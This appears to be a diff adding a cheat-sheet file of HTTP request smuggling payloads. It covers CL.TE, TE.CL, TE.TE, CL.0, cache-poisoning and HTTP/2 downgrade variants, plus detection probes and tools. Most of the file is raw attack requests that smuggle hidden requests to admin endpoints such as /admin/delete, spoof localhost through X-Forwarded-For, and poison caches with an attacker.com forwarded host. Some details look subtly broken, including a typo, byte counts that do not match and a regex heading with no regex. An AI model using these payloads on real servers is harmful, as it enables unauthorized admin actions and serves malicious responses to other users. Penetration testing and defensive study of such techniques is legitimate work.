@@ -1,0 +1,199 @@
+# HTTP Request Smuggling — Payloads & Techniques
+# Sources: PortSwigger, PayloadsAllTheThings, HackTricks (2025-2026)
+# Categories: CL.TE, TE.CL, TE.TE, CL.0, Transfer-Encoding variants
+
+# ============================================================
+# SECTION 1: CL.TE (Content-Length → Transfer-Encoding)
+# ============================================================
+
+# --- Basic CL.TE Smuggle ---
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+
+# --- CL.TE with Hostile Request (smuggle a GET) ---
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 55
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete HTTP/1.1
+Host: localhost
+X-Forwarded-For: 127.0.0.1
+
+
+# --- CL.TE Forward Proxy Attack ---
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 58
+Transfer-Encoding: chunked
+
+0
+
+GET http://127.0.0.1:8080/admin HTTP/1.1
+X-Forwarded-Host: localhost
+
+
+# ============================================================
+# SECTION 2: TE.CL (Transfer-Encoding → Content-Length)
+# ============================================================
+
+# --- Basic TE.CL Smuggle ---
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+66
+SMUGGLED
+0
+
+
+# --- TE.CL with Malicious Request ---
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+84
+POST /admin HTTP/1.1
+Host: localhost
+Content-Length: 15
+
+x=1
+0
+
+
+# ============================================================
+# SECTION 3: TE.TE (Obfuscated TE header)
+# ============================================================
+
+# --- Headers — Front-end sees TE, back-end misses it ---
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding:[tab]chunked
+[space]Transfer-Encoding: chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked
+Transfer-encoding: chunked
+TRANSFER-ENCODING: chunked
+Transfer-Encoding: chunked, x
+Transfer-Encoding: x, chunked
+
+# --- Double Transfer-Encoding Header ---
+# Front-end parses first TE:chunked, back-end parses second:
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+# --- TE.TE Smuggle (different TE interpretations) ---
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: identity
+
+5c
+POST /admin HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+# ============================================================
+# SECTION 4: CL.0 (Content-Length with no chunked TE)
+# ============================================================
+
+# --- CL.0 — Back-end ignores Content-Length ---
+# Front-end reads Content-Length and sends one request.
+# Back-end ignores Content-Length, treats body as next request.
+
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 47
+Connection: keep-alive
+
+GET /admin/delete HTTP/1.1
+Host: localhost
+Connection: close
+
+
+# ============================================================
+# SECTION 5: WEB CACHE POISONING VIA SMUGGLING
+# ============================================================
+
+# --- Smuggle → Cache Poison (serve malicious response to others) ---
+POST / HTTP/1.1
+Host: vulnerable.com
+Content-Length: 57
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+Host: attacker.com
+X-Forwarded-Host: attacker.com
+
+
+# ============================================================
+# SECTION 6: FRAMEWORK-SPECIFIC TECHNIQUES
+# ============================================================
+
+# --- Apache + Tomcat (AJP smuggling) ---
+# CVE-2020-1938 Ghostcat: read /WEB-INF/web.xml via AJP
+#   curl http://target:8009/WEB-INF/web.xml
+
+# --- Node.js (HTTP parser diff) ---
+# Node.js accepts both TE and CL when parsing, can lead to smuggling:
+#   Content-Length: 13
+#   Transfer-Encoding: chunked
+# Node uses chunked, gofrnt-end proxy uses CL
+
+# --- HTTP/2 Downgrade Smuggling ---
+# HTTP/2 request → front-end downgrades to HTTP/1.1 → smuggling via
+#   :method header injection or transfer-encoding in HTTP/2 headers
+
+# --- H2.TE (HTTP/2 TE smuggling) ---
+# Transfer-Encoding header in HTTP/2 pseudo-headers:
+#   :path: /
+#   transfer-encoding: chunked
+
+# ============================================================
+# SECTION 7: DETECTION / TESTING
+# ============================================================
+
+# --- Timing-based Detection ---
+# Send smuggling probe, measure delay if backend desyncs:
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 20
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+
+# After 5 seconds, send a normal request; if the first response
+# contains "SMUGGLED", the connection is poisoned.
+
+# --- Burp Suite Tools ---
+# Burp Repeater: manually craft smuggling payloads
+# HTTP Request Smuggler (Burp Ext): automated detection
+
+# --- smuggler.py ---
+#   python3 smuggler.py -u https://target.com
+
+# --- HTTP Request Smuggling Detection regex ---
+# Check if the server accepts malformed TE:
+#   curl -H "Transfer-Encoding: chunked" -d "test" http://target.com
+#   curl -H "Transfer-Encoding: x" -d "test" http://target.com
